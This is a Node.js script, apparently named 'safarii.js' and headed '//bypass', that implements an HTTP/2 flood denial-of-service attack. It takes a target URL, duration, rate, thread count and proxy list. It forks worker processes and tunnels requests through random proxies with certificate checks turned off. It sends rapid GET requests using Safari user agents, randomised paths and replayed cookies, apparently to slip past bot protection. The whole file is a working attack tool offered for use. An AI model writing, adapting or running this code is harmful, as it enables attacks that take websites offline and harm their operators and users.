//bypass
const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {});

if (process.argv.length < 7){
    console.log(`node safarii.js [target] [time] [rate] [thread] [proxy] --path`);
    process.exit();
}

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return min + ((Math.random() * (max - min + 1)) | 0);
}

function randomElement(arr) {
    return arr[(Math.random() * arr.length) | 0];
}

function randomString(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6],
    pathFlag: process.argv.includes('--path')
};

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

// Объект для хранения кук (Cookie Jar)
let cookieJar = {};

const useragents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1"
];

const sessionUA = randomElement(useragents);

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder, 0);
}

class NetSocket {
    constructor() { }
    HTTP(options, callback) {
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = Buffer.from(payload);
        const connection = net.connect({ host: options.host, port: options.port });

        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 100000);

        connection.on("connect", () => { connection.write(buffer); });
        connection.on("data", chunk => {
            if (chunk.toString("utf-8").includes("HTTP/1.1 200")) {
                callback(connection, undefined);
            } else {
                connection.destroy();
                callback(undefined, "error");
            }
        });
        connection.on("timeout", () => { connection.destroy(); });
        connection.on("error", () => { connection.destroy(); });
    }
}

const Socker = new NetSocket();

// Функция сборки кук из объекта в строку
function getCookieString() {
    return Object.entries(cookieJar)
        .map(([key, value]) => `${key}=${value}`)
        .join("; ");
}

function buildHeaders() {
    let rand_path = args.pathFlag ? (parsedTarget.path || "/") + `?${randomString(8)}=${randomIntn(1000, 9999)}` : (parsedTarget.path || "/");
    
    const headers = {
        ":method": "GET",
        ":scheme": "https",
        ":authority": parsedTarget.host,
        ":path": rand_path,
        "user-agent": sessionUA,
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "ru,en-US;q=0.9,en;q=0.8",
        "accept-encoding": "gzip, deflate, br",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "none",
        "upgrade-insecure-requests": "1"
    };

    const cookieStr = getCookieString();
    if (cookieStr) {
        headers["cookie"] = cookieStr;
    }

    return headers;
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    if (!proxyAddr) return;
    const [proxyHost, proxyPort] = proxyAddr.split(":");

    Socker.HTTP({
        host: proxyHost,
        port: ~~proxyPort,
        address: parsedTarget.host,
        timeout: 10
    }, (connection, error) => {
        if (error) return;

        const tlsConn = tls.connect({
            socket: connection,
            ALPNProtocols: ['h2'],
            servername: parsedTarget.host,
            rejectUnauthorized: false,
            minVersion: "TLSv1.2",
            maxVersion: "TLSv1.3"
        });

        const client = http2.connect(parsedTarget.href, {
            createConnection: () => tlsConn
        });

        client.on("connect", () => {
            setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(buildHeaders());

                    request.on("response", (headers) => {
                        const setCookie = headers["set-cookie"];
                        if (setCookie) {
                            // Обработка как массива, так и одиночной строки
                            const cookies = Array.isArray(setCookie) ? setCookie : [setCookie];
                            cookies.forEach(str => {
                                const parts = str.split(';')[0].split('=');
                                if (parts.length >= 2) {
                                    const key = parts[0].trim();
                                    const value = parts.slice(1).join('=').trim();
                                    cookieJar[key] = value;
                                }
                            });
                        }
                        request.close();
                        request.destroy();
                    });

                    request.end();
                }
            }, 1000);
        });

        client.on("error", () => {
            client.destroy();
            connection.destroy();
        });
    });
}

setTimeout(() => process.exit(1), args.time * 1000);
